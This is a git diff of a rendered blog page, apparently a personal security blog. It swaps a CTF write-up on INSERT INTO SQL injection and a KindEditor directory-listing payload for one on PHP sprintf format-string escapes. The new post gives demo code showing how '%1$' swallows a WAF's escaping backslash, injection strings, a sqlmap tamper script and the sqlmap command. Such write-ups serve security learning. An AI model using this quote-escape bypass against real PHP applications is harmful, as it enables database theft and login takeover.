@@ -2146,7 +2146,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://17307.github.io/2018/09/08/INSERT INTO 注入/">
+    <link itemprop="mainEntityOfPage" href="https://17307.github.io/2018/09/08/sprintf格式输出逃逸/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="o1hy">
@@ -2166,7 +2166,7 @@
           <h1 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2018/09/08/INSERT INTO 注入/" class="post-title-link" itemprop="url">INSERT INTO注入</a>
+                <a href="/2018/09/08/sprintf格式输出逃逸/" class="post-title-link" itemprop="url">sprintf格式逃逸注入</a>
               
             
           </h1>
@@ -2244,8 +2244,8 @@
                 </span>
             
                 <span class="post-meta-item-text">Comments: </span>
-                <a href="/2018/09/08/INSERT INTO 注入/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/09/08/INSERT INTO 注入/" itemprop="commentCount"></span>
+                <a href="/2018/09/08/sprintf格式输出逃逸/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/09/08/sprintf格式输出逃逸/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -2275,12 +2275,15 @@
       
         
           
-            <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>登陆,存在kindeditor编辑器,可以读取目录,无法上传,文件包含</p>
-<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>在文章post处,存在insert into的注入</p>
-<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><h3 id="INSERT-TO-语句"><a href="#INSERT-TO-语句" class="headerlink" title="INSERT TO 语句"></a>INSERT TO 语句</h3><p><code>INSERT INTO 表名称 VALUES (值1, 值2,....)</code></p>
-<h3 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h3><p>在本题中,发现无法闭合<code>&#39;</code>.同时由于插入的content部分为<code>&lt;textarea&gt;</code>,所以需要将payload插入到标题.<br>但是文章标题有长度限制,所以采取通过插入多条内容绕过.<br>通过尝试,得到插入语句应该为:<code>insert into 表 values (id,title,contetn)</code>.同时无法闭合最后的<code>&#39;与)</code>.所以只能构造出相应的闭合.  </p>
-<p><img src="1.png" alt="image"><br>可以查出用户的密码,解密后登陆到admin账户.<br>进入文章管理界面,存在文件包含或者读取漏洞.通过php伪协议读出flag.php.</p>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="kindeditor漏洞"><a href="#kindeditor漏洞" class="headerlink" title="kindeditor漏洞"></a>kindeditor漏洞</h3><h4 id="上传漏洞-此题无法使用"><a href="#上传漏洞-此题无法使用" class="headerlink" title="上传漏洞(此题无法使用)"></a>上传漏洞(此题无法使用)</h4><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>payload <code>http://d478b0827d21432bae695d8f71ad9a799e6bc2c58d184cbe.game.ichunqiu.com/kindeditor/php/file_manager_json.php?path=/</code><br><img src="2.png" alt="image"><br><img src="3.png" alt="image"></p>
+            <h1 id="格式化漏洞"><a href="#格式化漏洞" class="headerlink" title="格式化漏洞"></a>格式化漏洞</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>sql注入 + % 报错<br><img src="1.png" alt="1536150551652"></p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="格式化注入漏洞"><a href="#格式化注入漏洞" class="headerlink" title="格式化注入漏洞"></a>格式化注入漏洞</h3><p>在php调用<code>sprintf</code>函数时,如果 参数的数量少于 <code>%</code>数量,会报错.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select * from user where username = '%\' and 1=1#' and password='%s';"</span>;</span><br><span class="line">$args = <span class="string">"admin"</span>;</span><br><span class="line"><span class="keyword">echo</span> sprintf( <span class="string">"select * from user where username = '%\' and 1=1#' and password='%s';"</span>, $args) ;</span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$sql = <span class="string">"select * from user where username = '%1$\' and 1=1#' and password='%s';"</span>;</span><br><span class="line">$args = <span class="string">"admin"</span>;</span><br><span class="line"><span class="keyword">echo</span> sprintf( <span class="string">"select * from user where username = '%1$\' and 1=1#' and password='%s';"</span>, $args) ;</span><br><span class="line"><span class="comment">//select * from user where username = '' and 1=1#' and password='admin';</span></span><br></pre></td></tr></table></figure>
+<p>其中通过<code>%&#39;</code>会先被waf过滤为<code>%\&#39;</code>然后,<code>sprintf</code>会把<code>%\</code>吞掉.其中<code>%1$&#39;</code>原理一样.</p>
+<p>但是不知道为什么,<font color="red"><code>%&#39;</code>会报错. </font>而<code>%1$&#39;</code><font color="red">不会报错 </font>.</p>
+<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>构造参数 <code>admin%1$&#39; or 1=1</code> 与 <code>admin$1&#39; or 1=2</code>存在报错注入.可以通过sqlmap编写 tamper 去跑.</p>
+<h3 id="编写tamper"><a href="#编写tamper" class="headerlink" title="编写tamper"></a>编写tamper</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">v0.0.1</span></span><br><span class="line"><span class="string">2018.3.30</span></span><br><span class="line"><span class="string">filename: sprintf.py</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    通过格式化字符串漏洞来完成对单引号的闭合</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">"'"</span>, <span class="string">"%1$'"</span>)</span><br></pre></td></tr></table></figure>
+<p>然后执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r “request.txt” -p username –level 3 –dbms mysql –tamper sprintf.py</span><br></pre></td></tr></table></figure>
 
           
         
